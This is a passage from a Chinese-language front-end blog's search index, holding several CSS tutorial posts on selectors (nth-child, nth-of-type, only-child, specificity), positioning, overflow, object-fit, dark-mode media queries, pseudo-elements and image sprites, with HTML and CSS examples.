空白字元、換行字元因為換行與空白在 CSS 中都會自動被解析成「一個空格」，所以會產生大約「一個字」的空間，因此那條縫就是這樣產生的。 如何解決解決的方法很簡單，你有兩條路可以走。 讓這些空白字元一開始就不存在 讓這些空白字元所產生的空間小到你感覺不到。 所以你可以： 重新調整 HTML，讓標籤緊黏著標籤 HTML 註解法，空白/換行 的部分改成 HTML 註解 省略 HTML 的閉合標籤（但不建議這樣做…） 對元素設定 margin 負值（margin-right: -4px，大概就是一個字的大小） 在父層設定 font-size: 0，但要注意 繼承問題，子層的文字大小也會被設為 0。 不要用 inline-block，就是這麼簡單又暴力 詳細可以參考 這裡 Codepen： See the Pen inline-block中的魔法間距-01 by jim (@jubeatt) on CodePen.","link":"/2022/01/16/css-inline-block-problem/"},{"title":"CSS nth-child","text":"一定會用到的選取器。 簡單說明簡單來說就是「選到同一階層中的第 n 個」，例如說選奇數個： 1234567&lt;div class=\"wrapper\"&gt; &lt;div&gt;row1&lt;/div&gt; &lt;div&gt;row2&lt;/div&gt; &lt;div&gt;row3&lt;/div&gt; &lt;div&gt;row4&lt;/div&gt; &lt;div&gt;row5&lt;/div&gt;&lt;/div&gt; CSS： 123.wrapper div:nth-child(odd) { background-color: red;} 結果： 常犯的錯誤假設有段 HTML 長這樣： 123456&lt;div class=\"wrapper\"&gt; &lt;div class=\"bg-red\"&gt;row1&lt;/div&gt; &lt;div&gt;row2&lt;/div&gt; &lt;div class=\"bg-red\"&gt;row3&lt;/div&gt; &lt;div&gt;row4&lt;/div&gt;&lt;div&gt;row5&lt;/div&gt; 如果你想選第二個 .bg-red，你可能會這樣寫： 123.wrapper .bg-red:nth-child(even) { background-color: red;} 乍看之下意思好像是「選 .wrapper 下面偶數個 .bg-red」，但是不是這樣。 其實正確的順序是「先選到 .wrapper 底下的 nth-child(even) 元素」，接著才從這裡面找出有 .bg-red class 的元素。 拿剛剛的例子來說就是： 123456&lt;div class=\"wrapper\"&gt; &lt;div class=\"bg-red\"&gt;nth-child(1)&lt;/div&gt; &lt;div&gt;nth-childn(2)&lt;/div&gt; &lt;div class=\"bg-red\"&gt;nth-child(3)&lt;/div&gt; &lt;div&gt;nth-child(4)&lt;/div&gt;&lt;div&gt;row5&lt;/div&gt; nth-child(2) 的 div 並沒有 .bg-red 的 class，所以不會被選到，而第二個 .bg-red 實際上是 nth-child(3)，所以也不會被選到。 因此在看這種 selector 的時候，建議 「從後面往前看」，先看後面的 nth-child，在看前面的 class 名稱，會比較好理解一點。 nth-child(an+b)把 n 想成是你在寫迴圈的那個 i，它會從 0, 1, 2, … 一直跑。另外 a 跟 b 是一個常數，不填的話預設為 0。 所以可以這樣用： 12345678910111213.wrapper div:nth-child(0n+3) =&gt; 選到第 3 個 div.wrapper div:nth-child(2n+1) =&gt; 選到第 1 3 5 7 ... 個 div.wrapper div:nth-child(2n) =&gt; 選到第 0 2 4 6 ... 個 div.wrapper div:nth-child(3n) =&gt; 選到第 0 3 6 9 ... 個 div.wrapper div:nth-child(-1n+9) =&gt; 選到第 9 8 7 ... 個 div.wrapper div:nth-child(4n-2) =&gt; 選到第 -2 2 4 6 ... 個 div.wrapper div:nth-child(3n+1) =&gt; 選到第 1 4 7 ... 個 div","link":"/2022/01/13/css-nth-child/"},{"title":"CSS nth-of-type","text":"似曾相似？ 比 nth-child 更嚴謹一點這個跟 :nth-child() 差不多，差別在於它會「按照標籤來分組」： 123456789&lt;div class=\"wrapper\"&gt; &lt;div&gt;div1&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;p&gt;p2&lt;/p&gt; &lt;div&gt;div2&lt;/div&gt; &lt;p&gt;p3&lt;/p&gt; &lt;p&gt;p4&lt;/p&gt; &lt;div&gt;div3&lt;/div&gt;&lt;/div&gt; 如果想對第奇數個 &lt;p&gt; 做設定： 123.wrapper p:nth-of-type(odd) { background-color: orange;} 輕輕鬆鬆搞定！ 常犯的錯誤但如果這時候你改用 nth-child()，結果會跟你想的不太一樣： 123.wrapper p:nth-child(odd) { background-color: orange;} 結果： 這是因為 nth-child 會以「同階層」的元素來做排序，像這樣： 123456789&lt;div class=\"wrapper\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;p&gt;2&lt;/p&gt; &lt;p&gt;3&lt;/p&gt; &lt;div&gt;4&lt;/div&gt; &lt;p&gt;5&lt;/p&gt; &lt;p&gt;6&lt;/p&gt; &lt;div&gt;7&lt;/div&gt;&lt;/div&gt; 所以實際上會先選到第奇數個元素，接著才看是不是 &lt;p&gt;。（可以參考 這裡 的解釋） 至於 nth-of-type() 可以像成是這樣： 12345678910111213&lt;div class=\"wrapper\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;p&gt;1&lt;/p&gt; &lt;p&gt;2&lt;/p&gt; &lt;div&gt;2&lt;/div&gt; &lt;p&gt;3&lt;/p&gt; &lt;p&gt;4&lt;/p&gt; &lt;div&gt;3&lt;/div&gt;&lt;/div&gt; 所以一定要搞清楚它們兩個的差別。","link":"/2022/01/13/css-nth-of-type/"},{"title":"讓你不再煩惱圖片尺寸問題，object-fit 與 object-position","text":"真的很好用。 簡述兩者都是在 CSS3 定義的新屬性，除了 IE 以外大部分瀏覽器都有支援： 這兩個屬性用來設定「置換元素（replaced-element）」中的內容的填滿方式。 💡 註 1：置換元素簡單來說就是可以設定width與height的 inline-level 元素，例如：&lt;img&gt;💡 註 2：這個置換元素本身必須要有明確的寬跟高，換句話說就是必須有設置width與height才行。 其實你也可以把這兩個屬性當作是翻版的background-size和background-position，概念差不多。 使用方式我們直接來看怎麼使用吧： 123456&lt;div class=\"box\"&gt; &lt;h2 class=\"title\"&gt;picture&lt;/h2&gt; &lt;div class=\"item\"&gt; &lt;img class=\"pic\" src=\"image.jpg\" /&gt; &lt;/div&gt;&lt;/div&gt; 1234.pic { width: 250px; height: 500px;} 在我們對&lt;img&gt;設定寬高時，圖片會直接按照我們設定的寬高來呈現： 但如你所見，圖片的比例會跑掉，很不好看。 這時候只要加上 object-fit 就可以解決這個問題： 12345.pic { width: 250px; height: 500px; object-fit: cover;} object-fit可以設定的值有這些： 🚀 Codepen：點這裡 補充： fill 預設值，代表直接套用設定的寬高。 none 顯示原始尺寸。 scale-down 會從 none 跟 contain 裡面挑尺寸比較小的來套用。 cover contain 跟 background-size 的概念一樣。 至於 object-position 則是用來「調整位置」，跟 background-size 的概念 87 分像，這裡就不再舉例，請各位自己玩玩看，或是直接參考 MDN 中的範例。","link":"/2022/01/16/css-object-fit-and-object-position/"},{"title":"CSS only-child","text":"第一次碰到使用它的情況。 簡述在幫 highlight.js 設定 line-number 的樣式時，碰到了一個問題。 首先程式碼區塊的 HTML 大概長這樣： 1234567&lt;tabel&gt; &lt;tbody&gt; &lt;tr&gt;第 1 行程式碼&lt;/tr&gt; &lt;tr&gt;第 2 行程式碼&lt;/tr&gt; &lt;tr&gt;第 3 行程式碼&lt;/tr&gt; &lt;/tbody&gt;&lt;/tabel&gt; 為了讓上下方有一點 padding，我做了這樣的 CSS 設定： 123456789101112131415/* 第一行的 number 上方加 padding */.hljs-ln tr:first-child .hljs-ln-numbers { padding-top: 0.8em !important;}/* 最後一行的 number 下方加 padding */.hljs-ln tr:last-child .hljs-ln-numbers { padding-bottom: 0.8em !important;}/* 為了讓第一跟最後一行 code 對齊，設定 vertical-align */.hljs-ln tr:first-child .hljs-ln-code { vertical-align: bottom;}.hljs-ln tr:last-child .hljs-ln-code { vertical-align: top;} 出來的結果如下： 但是當只有一行程式碼的時候會有問題： 因為只有一行的時候會同時符合 :first-child 跟 :last-child，這時候就會套用在後面的那個，所以是 vertical-align: top。 這時候該怎麼處理？就用 only-child 來解決！只要加上這一行就完美搞定： 123.hljs-ln tr:only-child .hljs-ln-code{ vertical-align: middle;} 簡單來說，only-child 會選到沒有兄弟元素的元素。上面的 tr 正好就符合這個條件，所以才能選到。","link":"/2022/02/20/css-only-child/"},{"title":"CSS 之我的圖片有縫！","text":"礙眼啦！ 問題點通常我們會把圖片放在一個盒子裡，像這樣： 123&lt;div class=\"wrapper\"&gt; &lt;img src=\"https://process.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/resize=width:705/https://www.filepicker.io/api/file/9n6ZlBe3SbmlkuX2f2su\"&gt;&lt;/div&gt; 但這時候會發現下面多了一條「縫」： 這是因為 &lt;img&gt; 是「inline-level」的元素。 有個叫 vertical-align 的屬性是用專門用來設定 inline 元素的對齊方式。因為它的預設值是 baseline，所以才會多了那條縫，只要把它改成 middle 或 bottom 就可以解決了： 123img { vertical-align: middle;} 結果： 或其實也有另外一種作法，就是把 &lt;img&gt; 設成 inline 以外的元素也可以。","link":"/2022/01/13/css-picture-problem/"},{"title":"CSS 中的 overflow 與圓角的關係","text":"通常是滿版畫面才會踩到這個雷。 紀錄overflow 可以設定的值有： visible (預設值) clip auto hidden scroll inherit overflow 有一個用途是拿來與 border-radius 結合來製作圓角效果。 如果一個容器元素中的子元素是 100%填滿容器的話，單單在容器元素中設定 border-radius 是看不出效果的，你會看到子元素的部分會凸出去容器外面。 這是因為 border-radius 本身並不會改變容器的寬度，並且 overflow 的預設值為visible，所以為了能夠正確的顯示圓角，你還得再對 overflow 這個屬性做調整。 其實我一直以為overflow: hidden是最正確的作法，因為這是一個很直覺的想法，就隱藏起來嘛！所以當然要設成 hidden 不是嗎？ 大部分的情況下這是正確的，不過如果有一天容器的高度可能會被壓縮到很小的情況發生時，你就會發現這樣做會有個問題： 內容居然被腰斬了！ 是的，因為這就是overflow:hidden的作用，只要超出容器範圍的所有東西都會被隱藏起來。 所以當我發現這個問題後，我上網做了一些研究，才發現另外一件事： 如果想要將溢出容器的範圍給隱藏起來，其實並不是只有overflow:hidden這個做法，而是： 只要把 overflow 設為 visible 以外的值即可。 原理：只有 visible 這個值不會對容器做裁切 示範123&lt;div class=\"box\"&gt; &lt;div class=\"box__inner\"&gt;&lt;/div&gt;&lt;/div&gt; 12345678910111213141516171819202122232425262728293031html, body { /* 設定為跟視窗一樣的高（全屏） */ height: 100%; box-sizing: border-box; padding: 40px 0;}.box { /* 跟 body 一樣高，所以當視窗縮小時， box 的高度也會跟著縮小 */ width: 500px; height: 100%; margin: auto; border-radius: 30px; box-sizing: border-box; background-color: black; /* 如果是 hidden，把視窗的高縮小時 box 會被腰斬， 如果是 auto，box 裡面就會產生滾軸，不會被腰斬。 */ overflow: hidden; overflow: auto;}.box__inner { width: 100%; height: 400px; background-color: orange;} overflow: hidden： overflow: auto：","link":"/2022/01/16/css-overflow-problem/"},{"title":"CSS 中的定位（position）","text":"經典的定位屬性。 static瀏覽器預設的定位方式，該放在哪就放在哪： 123&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt;box2&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt; 123456.box { width: 100px; height: 100px; margin: 10px 0; background: orange;} 結果： relative根據原本（static）的位置來做偏移，要注意的是不會影響到旁邊的元素。 HTML： 123&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt;box2&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt; CSS： 1234567891011.box { width: 100px; height: 100px; margin: 10px 0; background: orange;}.box:nth-child(2) { position: relative; left: 120px; top: 50px;} 結果： absolute針對某個參考點來定位。就像 relative 是針對原本（static）的位置來定位一樣，absoulte 是讓你可以自己指定要參考點。 至於參考點的機制是：往上找不是 static 的元素，如果都找不到就把「視窗（viewport）」當參考點。 備註：要注意旁邊的元素會自動遞補空間。 下面讓 box-inner 以 box:nth-child(2) 來做定位： 123456789&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt; box-2 &lt;div class=\"box-inner\"&gt;X&lt;/div&gt;&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt;&lt;div class=\"box\"&gt;box4&lt;/div&gt;&lt;div class=\"box\"&gt;box5&lt;/div&gt;&lt;div class=\"box\"&gt;box6&lt;/div&gt; CSS： 123456789.box:nth-child(2) { position: relative;}.box-inner { position: absolute; top: 0; right: 0; background: red;} 結果： 如果沒有設定參考點的話就會定位到視窗（viewport）： 123456.box-inner { position: absolute; top: 0; right: 0; background: red;} 結果： 備註：如果你不信的話，試著把 &lt;html&gt; 跟 &lt;body&gt; 都設成固定寬高，就會發現元素的位置隨著不會改變，這就證明參考點不是它們。 fixed根據視窗（viewport）的位置來定位，特性是不管怎麼捲動都會在原本的位置。 備註：要注意旁邊的元素會自動遞補空間。 123456&lt;div class=\"box\"&gt;box1&lt;/div&gt;&lt;div class=\"box\"&gt;box2&lt;/div&gt;&lt;div class=\"box\"&gt;box3&lt;/div&gt;&lt;div class=\"box\"&gt;box4&lt;/div&gt;&lt;div class=\"box\"&gt;box5&lt;/div&gt;&lt;div class=\"box\"&gt;box6&lt;/div&gt; CSS： 12345678.box:nth-child(2) { position: fixed; width: 100px; height: 100px; right: 100px; bottom: 100px; background-color: red;} 結果： sticky在碰到 top 的點之前是 static，碰到之後就黏住（很像 fixed 的感覺）： 備註：此處的參考點是視窗（viewport） CSS： 12345.box:nth-child(2) { position: sticky; top: 10px; background-color: red;} 結果： z-index用來設定圖層的位置，舉例來說： 12345678&lt;body&gt; &lt;div class=\"box\"&gt;box1&lt;/div&gt; &lt;div class=\"box\"&gt;box2&lt;/div&gt; &lt;div class=\"box\"&gt;box3&lt;/div&gt; &lt;div class=\"box\"&gt;box4&lt;/div&gt; &lt;div class=\"box\"&gt;box5&lt;/div&gt; &lt;div class=\"box\"&gt;box6&lt;/div&gt;&lt;/body&gt; CSS： 12345678910111213.box { background: orange; width: 300px; height: 200px; margin: 10px 0px; font-size: 2em; text-align: center; position: relative;}.box:nth-child(2) { top: -100px; background-color: red;} 結果： CSS： 12345678910111213.box { background: orange; width: 300px; height: 200px; margin: 10px 0px; font-size: 2em; text-align: center; position: relative;}.box:nth-child(2) { top: 100px; background-color: red;} 結果： 同樣都是覆蓋，但在後面的會蓋掉前面的，如果不想被蓋呢？加上 z-index CSS： 1234567891011121314.box { background: orange; width: 300px; height: 200px; margin: 10px 0px; font-size: 2em; text-align: center; position: relative;}.box:nth-child(2) { top: 100px; background-color: red; z-index: 1;} 結果：","link":"/2022/01/12/css-position/"},{"title":"讓網頁變得更潮，prefers-color-scheme","text":"潮潮潮。 使用方法這個東西好像有點邊緣，所以想跟大家分享一下：prefers-color-scheme 它是 meida query 中的一個特徵功能，就跟 (max-width: 666px) 是一樣的東西。 讓我們看一下 MDN 的定義吧： The prefers-color-scheme CSS media feature is used to detect if the user has requested a light or dark color theme. 簡單來說，prefers-color-scheme 是用來偵測使用者是否有使用「淺色」或「深色」的主題。 當使用者設定的主題是淺色時，會被 @media (prefers-color-scheme: light) 給偵測到，反之，當主題是深色時，會被 @media (prefers-color-scheme: dark) 給偵測到。 而它的偵測來源是作業系統中的設定： 所以直接讓我們來看個示範： 12345678&lt;div class=\"box\"&gt; &lt;p class=\"txt\"&gt; 這個區塊會根據你在作業系統中的主題設置來變更成深色 / 淺色主題。 &lt;/p&gt; &lt;p class=\"txt\"&gt; 現在你正在使用的是 &lt;span class=\"userThemeCheck\"&gt;&lt;/span&gt; 主題。 &lt;/p&gt;&lt;/div&gt; 12345678910111213141516171819202122232425.box { // ↓ 淺色主題設定（白底黑字） background-color: $primary-white; color: $black;}.userThemeCheck::after { // ↓ 淺色主題顯示文字 content: '淺色'; // ↓ 綠色文字 color: $green;}// ↓ 深色主題設定（黑底白字）@media (prefers-color-scheme: dark) { .box { background-color: $black; color: $white; } .userThemeCheck::after { content: '深色'; // ↓ 黃色文字 color: $yellow; }} 🚀 Codepen：點這裡","link":"/2022/01/16/css-prefers-color-scheme/"},{"title":"CSS 一些久了可能會忘記的屬性","text":"如題，所以開一篇來做彙整，要查的時候比較方便。 文字相關white-space 決定「空白」跟「換行」的樣式。 123456789101112.box { /* 換行跟空格都只顯示為一個空格（預設） */ white-space: normal; /* 不換行 */ white-space: nowrap; /* 保留原本在編輯器的格式 */ white-space: pre; /* 保留換行格式，但空格只會當作一個 */ white-space: pre-line; /* 跟 pre 一樣，但超出範圍的時候會換行 */ white-space: pre-wrap;} word-spacing 設定「單字（空格）」之間的間隔： 123456.box { /* 預設值 */ word-spacing: normal; /* 設定單位 */ word-spacing: 1em; } letter-spacing 設定「每一個字」的間隔： 12345.box { /* 預設值 */ letter-spacing: normal; letter-spacing: 1px;} word-break 設定文字的換行規則。 詳細介紹可以參考：CSS 之我的文字太長啦 12345678.box { /* 依照空格或換行來斷行（預設） */ word-break: normal; /* 超出寬度範圍就斷行 */ word-break: break-all; /* 依照單字來斷行 */ word-break: break-word;} text-shadow 設定文字的陰影 123456.text { /* offset-x | offest-y | blur-radius | color */ text-shadow: 1px 1px 2px black; /* 跟 box-shadow 一樣，可以有多層陰影 */ text-shadow: 1px 1px 2px black 2px 2px 2px pink;} 排版相關box-sizing 設定盒子的計算方式 詳細介紹可以參考：CSS 盒模型（box-model） 123456.box { /* 寬高代表 content（預設） */ box-sizing: content-box; /* 寬高代表 content + padding + border */ box-sizing: border-box;} overflow 設定該怎麼處理溢出內容 12345678910.box { /* 超出寬度依然會顯示（預設） */ overflow: visible; /* 超出寬度就隱藏 */ overflow: hidden; /* 顯示滾軸，不管有沒有超出寬度 */ overflow: scroll; /* 超出寬度時，顯示滾軸 */ overflow: auto;} max-content 讓 width 依照內容來調整 123&lt;div&gt; &lt;h1&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit.&lt;/h1&gt;&lt;/div&gt; 123456789101112div { width: 100px; height: 50px; padding: 10px; border: 1px solid #000;}h1 { font-size: 1em; background-color: antiquewhite; /* 預設寬度是參考 div，但現在變成參考「文字內容」 */ width: max-content;} 傳統用 nowrap 的情況，內容寬度是參考容器： 123456h1 { font-size: 1em; background-color: antiquewhite; /* 超出的文字不會有額外加上寬度 */ white-space: nowrap;} max(base ,minimum) 用來設定最小寬度，可以想成是語法糖。 12345/* 最少 100px，比 100px 大就採用 50% */.box { width: 50%; min-width: 100px;} 利用 max() 寫成一行： 1234/* 最少 100px，比 100px 大就採用 50% */.box { width: max(50%, 100px);} 這兩個結果會是一模一樣的。 min(base ,maximum) 用來設定最大寬度，一樣想成是語法糖。 12345/* 最多 1280px，比 1280px 小就採用 90% */.container { width: 90%; max-width: 1280px;} 利用 min() 寫成一行： 1234/* 最多 1280px，比 1280px 小就採用 90% */.container { width: min(90%, 1280px);} 其他overscroll-behavior 用來阻止滾軸的傳遞行為 預設是 auto，當子元素滾到邊界時，會傳遞給父元素： 123.modal__inner { overscroll-behavior: auto} 設定成 contain 後就不會傳遞了： 123.modal__inner { overscroll-behavior: contain} scrollbar-gutter 自動預留滾軸空間 備註：要設定這個屬性的元素 overflow 必須是 visible 以外的值才有效，另外 &lt;body&gt; 沒辦法用。 12345.container { scrollbar-gutter: auto scrollbar-gutter: stable scrollbar-gutter: stable both-edges} 預設是 auto，當滾軸出現的時候容易跑版： stable 會在右邊預留空間（自動加上一段 padding） stable 會在左右邊都預留空間（自動加上一段 padding） scroll-snap-type 和 scroll-snap-align 簡單來說想成是一種排版用的盒子（像 Flex 或 Grid）： scroll-snap-type 用來設定容器 scroll-snap-align 用來設定子元素。 這個屬性能做出這樣的效果： 設定方式： 1234567891011121314151617.container { /* 比較嚴格 */ scroll-snap-type: x mandatory; /* 沒那麼嚴格 */ scroll-snap-type: x proximity; /* 同時設定 x 軸與 y 軸行為 */ scroll-snap-type: both mandatory ;}.item { /* 用來設定中斷點（一定要設才有效果） 跟 justify-content 的感覺很類似 */ scroll-snap-align: start; scroll-snap-align: end; scroll-snap-align: center;} start： end： center： mandatory 與 proximity 的差別參考下圖。 mandatory： proximity： pointer-events 設定鼠標事件，可以做出讓上面那層碰不到，只能碰到下面的。 備註：因為這個屬性會繼承，所以下面的記得要在設定一次。 以下把 &lt;a&gt; 的鼠標事件停用，所以只有 &lt;span&gt; 上的 :hover 會被觸發： 123&lt;a href=\"#\"&gt; &lt;span&gt;enable-event&lt;/span&gt;&lt;/a&gt; 123456789101112131415161718192021222324a { /* 停用 a 的鼠標事件 */ pointer-events: none; display: inline-block; text-decoration: none; width: 100px; height: 100px; background-color: rgba(0,0,0,0.5); text-align: center;}/* 設定碰到 a 的 hover 效果 */a:hover span { color: red;}span { /* 啟用 span 的鼠標事件 */ pointer-events: all; line-height: 100px; color: white;}/* 設定碰到 span 的 hover 效果 */span:hover { color: red;} Output：","link":"/2022/01/13/css-property/"},{"title":"CSS pseudo-element","text":"博大精深。 ::before ::after備註：這邊只介紹這兩個，其他可以參考：偽元素一覽表 為了跟 Pseudo-class 做區別，會用「::」來表示。 它的作用就很像是幫你產生一個虛擬的 &lt;span&gt;，然後可以設定內容跟樣式是什麼： 123&lt;div&gt;100&lt;/div&gt;&lt;div&gt;100&lt;/div&gt;&lt;div&gt;100&lt;/div&gt; 1234/* $100 */div::before{ content: '$';} 但注意一定要設定 content，不然不會產生虛擬元素。如果沒有內容能設定成「空字串」。 另外 content 還有一個特別的值：attr()，可以把標籤的屬性值當作內容： 123&lt;div data-symbol=\"NTD\"&gt;100&lt;/div&gt;&lt;div data-symbol=\"USD\"&gt;100&lt;/div&gt;&lt;div data-symbol=\"TWD\"&gt;100&lt;/div&gt; 123456789/* 記得 attr 內不要加引號 100NTD 100USD 100TWD*/div::before { content: attr(data-symbol);} 這樣的好處是可以讓 HTML 乾淨很多，不然你原本得這樣寫： 123&lt;div&gt;100&lt;span&gt;NTD&lt;/span&gt;&lt;/div&gt;&lt;div&gt;100&lt;span&gt;USD&lt;/span&gt;&lt;/div&gt;&lt;div&gt;100&lt;span&gt;TWD&lt;/span&gt;&lt;/div&gt;","link":"/2022/01/12/css-pseudo-element/"},{"title":"CSS 利用 Signature 來讓導覽列更好寫","text":"偶然翻書學到的。 簡述簡單來說就是在 body 上添加特定的 class / id 來表示「狀態」。 來看一個在寫導覽列按鈕時常會碰到的問題，假設有個頁面的 HTML 長這樣： 1234567&lt;!-- 頁面一 --&gt;&lt;ul&gt; &lt;li&gt;&lt;a class=\"link current\" href=\"#\"&gt;頁面一&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;頁面二&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;頁面三&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;頁面四&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt; 為了讓 user 知道目前所在位置，通常會用 CSS 把那個目前的位置給「標示出來」，所以根據上面的內容，會這樣寫： 1234567.link { color: black;}/* 改成紅字代表目前位置 */.link.active { color: red;} 好，最麻煩問題來了。如果我要讓其他頁面也能配合這個 CSS，我就得改 HTML： 12345678&lt;!-- 頁面二 --&gt;&lt;ul&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;頁面一&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link current\" href=\"#\"&gt;頁面二&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;頁面三&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"#\"&gt;頁面四&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;!-- 其他以此類推 --&gt; 只是加個 class 好像不麻煩？也許是這樣沒錯。可是，如果你有 100 個頁面，有天 PM 這樣跟你說： 欸欸，那個 current 的語意不太好懂，改成 active 好嗎？ 這下你除了改一隻 CSS 檔案以外，你還得把每個頁面的 HTML 都調整成 active。這個時候你還覺得不麻煩嗎？ 所以其實有更好的做法，參考以下解法： 12345678&lt;body id=\"home\"&gt; &lt;ul&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page1\"&gt;頁面一&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page2\"&gt;頁面二&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page3\"&gt;頁面三&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a class=\"link\" href=\"page4\"&gt;頁面四&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt; 12345678910111213141516171819.link { color: blue;}/* home 頁面就標示出來 */#home .link[href=\"page1\"] { color: red;}/* about 頁面就標示出來 */#about .link[href=\"page2\"] { color: red;}/* servie 頁面就標示出來 */#servie .link[href=\"page3\"] { color: red;}/* product 頁面就標示出來 */#product .link[href=\"page4\"] { color: red;} 這個就跟 JavaScript 裡的 event delegation 有點異曲同工之妙，與其從按鈕來判定目前狀態，倒不如交給上層的父元素來處理不就好了？ 雖然這個做法一樣要調整 HTML，但要調整的地方會少很多。因為你把「狀態」都交給 body 來控制了。 目前只有連結可能感受不太到差異，可是當有其他類似的樣式也是針對「特定頁面」來處理的時候，就會明白現在的做法比較好。 總而言之，現在把狀態都透過 body 的 class / id 來管理，你只要把重點著重在 CSS 就好，不用再針對特定元素來一個一個調整了。","link":"/2022/03/05/css-signature/"},{"title":"CSS Selector 的權重","text":"原來如此。 大方向可以先記一個大方向：id &gt; class &gt; 標籤，越詳細的贏 HTML： 備註：下面要示範的是改 Pick me 的文字色彩 1234567&lt;div class=\"wrapper\"&gt; &lt;div class=\"list\"&gt; &lt;div class=\"item\" id=\"pickme\"&gt; Pick me &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; CSS： 123456.wrapper { color: red;}.item { color: pink;} 按照剛剛說的規則， .item 跟 .wrapper 權重雖然一樣，但是 .item 會比較詳細。一個是「繼承」，一個是「直接選到元素」，所以 Pick me 最後會套用 .item 的規則。 再來看一個： 123456789.wrapper { color: red;}.item { color: pink;}#pickme { color: blue;} 這時候明顯是 #pickme 贏過 item 跟 .wrapper，因為 id &gt; class。所以 Pick me 最後會套用 #pickme 的規則。 再來看一個： 123456789101112.wrapper { color: red;}.item { color: pink;}div.wrapper &gt; div.list &gt; div.item { color: yellow;}#pickme { color: blue;} 這時候雖然 div.wrapper &gt; div.list &gt; div.item 看起來很詳細，但它還是比不過 id，所以 Pick me 最後還是會套用到 #pickme 的規則。 權重的計算方式理解大方向後，你可以把剛剛的規則想成是這樣子： 舉例來說： 如果 selector 有 id，id 欄位的分數就是 1，沒有的話就是 0 如果 selector 有 2 個 tag，tag 欄位的分數就是 2 如果 selector 有 3 個 class，class 欄位的分數就是 3 如果規則裡有 !important，!important 欄位的分數就是 1，沒有的話就是 0 如果是 inline-style，inline-style 欄位的分數就是 1，沒有的話就是 0 所以把剛剛的例子拿來計算會是這樣子： 123456789101112131415161718192021/* !important 跟 inline-style 的部分都是 0， 所以這邊先忽略前面的兩個 0*//* 0, 1, 0 */.wrapper { color: red;}/* 0, 1, 0 */.item { color: pink;}/* 0, 3, 3 */div.wrapper &gt; div.list &gt; div.item { color: yellow;}/* 1, 0, 0 */#pickme { color: blue;} 所以上面的權重就會是： #pickme &gt; div.wrapper &gt; div.list &gt; div.item &gt; .item = .wrapper 權重如果一樣，就看位置，在「後面」的那個會被套用，所以 .item 會蓋掉 .wrapper。 另外要特別注意每個欄位要「拆開來看」，不要合在一起當成數字，不然很容易搞錯。 例如說： 12 個 class =&gt; 120 1 個 id 是 =&gt; 100 這樣會誤以為是 120 比較大，但是不是這樣。一定要拆開來看： 12 個 class =&gt; 0, 12, 0 1 個 id 是 =&gt; 1, 0, 0 意思是說無論你有幾個 class，你都不可能蓋掉 id，因為 id 的權重永遠比 class 高，不是逢十就能進位。 !important 或 inline-style 也是相同道理，你用再多 class 或 id 都不可能蓋掉： 123456789101112/* 0, 0, 0, 1, 0 */.wrapper { color: red;}/* 1, 0, 0, 1, 0 */.item { color: pink !important;}/* 0, 1, 0, 3, 3 */div.wrapper &gt; div.list &gt; div#pickme.item { color: yellow;}","link":"/2022/01/12/css-specificity/"},{"title":"CSS 利用 Sprite 來提升效能","text":"希望有朝一日能派上用場。 簡述簡單來說就是「把很多張圖片拼成一張」，這樣可以省下發 request 的次數。 可以想成是在窗外放了一個超大的海報，只要調整海報的位置，就會看到不一樣的畫面，這個就是 Sprite 的把戲。 實作直接來看個例子，假設我有一張圖片長這樣： 我想把它做成三顆 &lt;button&gt;，所以 HTML 長這樣： 12345&lt;div class=\"buttons\"&gt; &lt;button&gt;&lt;/button&gt; &lt;button&gt;&lt;/button&gt; &lt;button&gt;&lt;/button&gt;&lt;/div&gt; 接下來就來用 CSS 做出 Sprite。先大概講一下原理： 幫每個 &lt;button&gt; 都套用同一張背景圖片 利用 background-position 來調整位置（這個是重點） 所以 CSS 就會這樣寫： 123456789101112131415161718192021222324.buttons { width: 300px; padding: 10px; margin: auto; border: 1px solid #000;}/* 每個按鈕的共通樣式 */button { width: 51px; height: 51px; background-image: url('./button.png'); background-repeat: no-repeat; background-color: transparent; border: none; padding: 0;}/* 把背景圖片往左移 51 px */button:nth-child(2) { background-position: -51px 0;}/* 把背景圖片往左移 102 px */button:nth-child(3) { background-position: -102px 0;} 備註：每個按鈕的寬高是由圖片來決定。像這邊的圖片尺寸為 154x51，所以一個按鈕才設定為 51x51 成功的話就會長這樣： 以上就是 Sprite 的技巧，雖然這個技巧會花比較多工夫，但善用的話就能為伺服器節省不少流量與負擔。","link":"/2022/03/05/css-sprite/"},{"title":"在 CSS 中做字串拼接","text":"以前不知道的小技巧。 簡述利用擬元素（Pseudo-element）產生的文字內容其實是可以做字串拼接的，例如說： 123456 &lt;ul&gt; &lt;li&gt;aaaa&lt;/li&gt; &lt;li&gt;bbbb&lt;/li&gt; &lt;li&gt;cccc&lt;/li&gt; &lt;li&gt;dddd&lt;/li&gt;&lt;/ul&gt; 12345li::before { content: 'String' 'A' '&amp;' 'C'; 